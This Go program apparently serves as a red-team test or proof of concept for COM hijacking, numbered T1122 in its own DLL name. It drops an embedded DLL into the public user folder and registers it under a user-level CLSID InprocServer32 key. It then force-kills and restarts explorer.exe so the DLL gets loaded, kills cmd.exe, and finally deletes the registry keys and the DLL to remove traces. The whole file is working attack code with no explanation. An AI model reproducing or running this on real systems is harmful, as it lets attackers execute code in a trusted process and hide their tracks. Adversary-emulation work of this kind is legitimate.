package main

import (
	"log"
	"os/exec"
	"time"

	"./bindata"
	"golang.org/x/sys/windows/registry"
)

func main() {
	bindata.RestoreAssets(`C:\Users\Public\`, "T1122.dll")
	//创建：指定路径的项
	//路径：HKEY_CURRENT_USER\Software\Hello Go
	key, exists, _ := registry.CreateKey(registry.CURRENT_USER, `Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32`, registry.ALL_ACCESS)
	defer key.Close()

	// 判断是否已经存在了
	if exists {
		println(`键已存在`)
	} else {
		println(`新建注册表键`)
	}
	key.SetStringValue(``, `C:\Users\Public\T1122.dll`)
	key.SetStringValue(`ThreadingModel`, `Apartment`)
	kill_explorer := exec.Command("taskkill.exe", "/f", "/im", "explorer.exe")
	kill_explorer.Start()
	time.Sleep(time.Duration(2) * time.Second)
	cmd_explorer := exec.Command("explorer.exe") ///查看当前目录下文件
	cmd_explorer.Start()
	time.Sleep(time.Duration(2) * time.Second)
	kill_cmd := exec.Command("taskkill.exe", "/f", "/im", "cmd.exe")
	kill_cmd.Start()
	time.Sleep(time.Duration(2) * time.Second)
	key1, err := registry.OpenKey(registry.CURRENT_USER, `Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32`, registry.ALL_ACCESS)
	if err != nil {
		log.Fatal(err)
	}
	defer key1.Close()

	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32`)
	key2, err := registry.OpenKey(registry.CURRENT_USER, `Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}`, registry.ALL_ACCESS)
	if err != nil {
		log.Fatal(err)
	}
	defer key2.Close()

	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}`)

	exec.Command("cmd.exe", `/c del C:\Users\Public\T1122.dll`).Start()

}
